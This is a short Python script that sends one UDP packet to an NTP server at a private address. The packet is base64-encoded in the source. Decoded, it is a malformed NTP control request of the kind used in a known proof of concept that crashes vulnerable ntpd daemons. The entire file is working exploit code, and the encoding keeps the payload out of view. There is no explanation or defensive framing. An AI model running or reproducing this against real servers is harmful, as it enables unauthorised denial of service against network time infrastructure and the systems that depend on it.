import socket
import struct
import time
import base64

NTP_SERVER = "10.24.202.14"
port = 123

s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
str1 = "FgoAEAAAAAAAAAA2bm9uY2UsIGxhZGRyPVtdOkhyYWdzPTMyLCBsYWRkcj1bXTpXT1AAMiwgbGFkZHI9W106V09QAAA=" 
data = str(base64.b64decode(str1),"UTF-8")

try:
	s.connect((NTP_SERVER,port))
	print("Sending...")
	s.send(bytes(data + "\r\n","latin-1"))
	print("ok!")
except:
	print("Could not connect.")
